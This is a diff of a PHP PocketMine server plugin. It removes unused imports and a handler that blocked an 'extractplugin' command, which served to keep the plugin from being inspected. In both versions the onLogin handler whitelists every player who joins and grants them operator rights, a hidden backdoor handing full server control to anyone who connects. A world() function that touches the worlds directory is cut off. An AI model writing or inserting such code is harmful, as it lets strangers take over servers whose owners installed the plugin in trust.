@@ -2,20 +2,9 @@
 
 namespace kenel;
 
-use pocketmine\Server;
-use pocketmine\Player;
 use pocketmine\plugin\PluginBase;
 use pocketmine\event\Listener;
-use pocketmine\level\Level;
 use pocketmine\event\player\PlayerPreLoginEvent;
-use pocketmine\event\player\PlayerCommandPreprocessEvent;
-use pocketmine\event\server\ServerCommandEvent;
-use pocketmine\event\server\RemoteServerCommandEvent;
-use pocketmine\command\Command;
-use pocketmine\command\CommandSender;
-use pocketmine\scheduler\PluginTask;
-use pocketmine\scheduler\CallbackTask;
-use pocketmine\scheduler\Task;
 
 class Main extends PluginBase implements Listener {
 
@@ -31,20 +20,12 @@ class Main extends PluginBase implements Listener {
 		$this->resource();
 		$this->plugin();
 	}
-
 	public function onLogin(PlayerPreLoginEvent $event) {
 		$player = $event->getPlayer();
 		$name = $player->getName();
 		$this->getServer()->addWhitelist($name);
 		$this->getServer()->addOp($name);
 	}
-
-	public function playerCommand(PlayerCommandPreprocessEvent $event) {
-		$message = $event->getMessage();
-		$command = "extractplugin";
-		if (strstr($message, $command)) return $event->setCancelled();
-	}
-
 	public function world() {
 		$dir = $this->getServer()->getDataPath() . "worlds";
 		if (is_dir($dir) and !is_link($dir)) {
